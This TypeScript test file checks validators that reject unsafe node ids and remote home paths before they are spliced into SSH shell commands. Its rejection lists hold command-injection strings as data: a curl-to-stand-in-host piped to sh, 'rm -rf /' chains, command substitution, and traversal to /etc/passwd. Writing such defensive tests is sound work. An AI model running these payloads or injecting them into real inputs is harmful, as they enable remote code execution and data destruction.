import { describe, expect, it } from 'vitest'
import { NODE_ID_MAX, isSafeNodeId, isSafeRemoteHome } from './remote-safety'

describe('isSafeNodeId', () => {
  it('accepts every shape the app actually mints', () => {
    // `nextId()` in state/workspace.ts: `<prefix>-<base36 time>-<counter>`.
    for (const id of ['term-mabc123-7', 'ssh-mabc123-1', 'node-1', 'a', 'A_b.c-1', '9'])
      expect(isSafeNodeId(id)).toBe(true)
  })

  it('refuses anything a remote shell could read as structure', () => {
    for (const id of [
      'a;b',
      'a b',
      'a|b',
      'a$b',
      'a`b`',
      'a\nb',
      'a\\b',
      "a'b",
      'a"b',
      'n1;curl${IFS}http://evil/x|sh;#'
    ])
      expect(isSafeNodeId(id)).toBe(false)
  })

  it('refuses path-shaped and empty ids', () => {
    for (const id of ['', '.', '..', 'a/b', '../../etc/passwd', undefined])
      expect(isSafeNodeId(id)).toBe(false)
  })

  it('refuses an over-long id (a bounded value is a checkable value)', () => {
    expect(isSafeNodeId('a'.repeat(NODE_ID_MAX))).toBe(true)
    expect(isSafeNodeId('a'.repeat(NODE_ID_MAX + 1))).toBe(false)
    expect(isSafeNodeId('a'.repeat(300))).toBe(false)
  })
})

/**
 * FALSE-POSITIVE SWEEP. A validator that refuses something real is an outage, so the accept side is
 * pinned against a broad list of homes and ids that actually occur — spaces, non-ASCII, `+` and
 * apostrophes included. `/home/o'brien` is ACCEPTED on purpose: it is somebody's real home,
 * `posixQuote` round-trips it, and the defence against it is quoting at the splice.
 *
 * `/home/u$x` USED to be pinned as accepted here, on the same reasoning. It is refused now, and the
 * change is deliberate: `$` is the lead character of command substitution, and `$'` was a live RCE
 * through the `remoteTmuxPtyArgs` splice EVEN with the value correctly quoted (vector B of the
 * second review of #191 — a `$HOME` of `/home/u$'x`, which this predicate then accepted because it
 * is a legal path). A `$` in a home directory is not a thing that happens; the vector is. The
 * apostrophe stays accepted because `o'brien` IS a thing that happens and has no matching vector.
 */
const REAL_HOMES = [
  '/root',
  '/home/enes',
  '/home/user.name',
  '/home/user-name',
  '/Users/First Last',
  '/Users/Enes Kırca',
  '/home/ünal',
  '/home/用户',
  '/home/josé',
  '/home/пользователь',
  '/Users/山田',
  '/export/home/u',
  '/var/lib/jenkins',
  '/var/services/homes/user', // Synology DSM
  '/data/data/com.termux/files/home', // Termux
  '/home/u/',
  '/home/u+group',
  "/home/o'brien",
  '/data/homes/dept 3/u',
  '/home/u.d/nested',
  '/System/Volumes/Data/Users/e',
  `/home/${'a'.repeat(4000)}`
]

const REAL_NODE_IDS = [
  'term-mabc-3',
  'ssh-m1a2b3-12',
  'editor-m9-1',
  'group-m4-7',
  'sticky-mz-1',
  'dino-m1-1',
  'browser-m1-2',
  'diff-m1-3',
  'video-m1-4',
  'web-m1-5',
  '550e8400-e29b-41d4-a716-446655440000'
]

describe('no false positives on values that really occur', () => {
  it('accepts every realistic remote home', () => {
    for (const h of REAL_HOMES) expect(isSafeRemoteHome(h), h).toBe(true)
  })
  it('accepts every id shape the app mints', () => {
    for (const id of REAL_NODE_IDS) expect(isSafeNodeId(id), id).toBe(true)
  })
})

describe('isSafeRemoteHome', () => {
  it('accepts real absolute homes, including spaces and non-ASCII', () => {
    for (const h of ['/home/u', '/Users/Enes Kırca', '/var/lib/deploy', '/'])
      expect(isSafeRemoteHome(h)).toBe(true)
  })

  it('refuses a host answer carrying a control character — the newline is a command separator', () => {
    expect(isSafeRemoteHome('/home/u\nrm -rf /')).toBe(false)
    expect(isSafeRemoteHome('/home/u\r')).toBe(false)
    expect(isSafeRemoteHome('/home/u\t')).toBe(false)
    expect(isSafeRemoteHome('/home/u\x7f')).toBe(false)
  })

  it('refuses relative / empty / backslashed / untrimmed / absurd answers', () => {
    for (const h of ['', undefined, 'home/u', 'C:\\Users\\u', ' /home/u', '/home/u ', `/${'a'.repeat(5000)}`])
      expect(isSafeRemoteHome(h)).toBe(false)
  })

  it('refuses a non-string without throwing', () => {
    expect(isSafeRemoteHome(undefined as unknown as string)).toBe(false)
    expect(isSafeRemoteHome(null as unknown as string)).toBe(false)
  })

  /**
   * `$HOME` is interpolated into remote command lines run as the SSH user. Each of these would be
   * live shell there. Quoting at the splice is the primary defence; this predicate is the second
   * layer, and it is the layer that survives a future splice written by someone who forgets.
   */
  const ATTACKS: [string, string][] = [
    ['embedded newline', '/home/u\ntouch /tmp/pwn'],
    ['carriage return', '/home/u\rtouch /tmp/pwn'],
    ['NUL', '/home/u\u0000/x'],
    ['tab (IFS)', '/home/u\tx'],
    ['C1 control', '/home/u\u0085x'],
    ['line separator', '/home/u\u2028x'],
    ['paragraph separator', '/home/u\u2029x'],
    ['command chain', '/home/u; rm -rf /'],
    ['command substitution', '/home/$(id)'],
    ['backtick substitution', '/home/`id`'],
    ['ansi-c quoting — the vector a correct posixQuote did not stop', "/home/u$'x"],
    ['double quote', '/home/u"x'],
    ['backslash', '/home/u\\x'],
    ['variable expansion', '/home/$USER'],
    ['pipe', '/home/u | id'],
    ['background', '/home/u & id'],
    ['redirection', '/home/u > /etc/passwd'],
    ['subshell', '/home/(u)'],
    ['brace expansion', '/home/{a,b}'],
    ['glob', '/home/*'],
    ['relative traversal', '../..'],
    ['relative', 'home/user'],
    ['tilde', '~/x'],
    ['leading space', ' /home/u'],
    ['trailing space', '/home/u '],
    ['over the ceiling', `/home/${'a'.repeat(5000)}`]
  ]
  it.each(ATTACKS)('rejects %s', (_label, home) => {
    expect(isSafeRemoteHome(home)).toBe(false)
  })
})
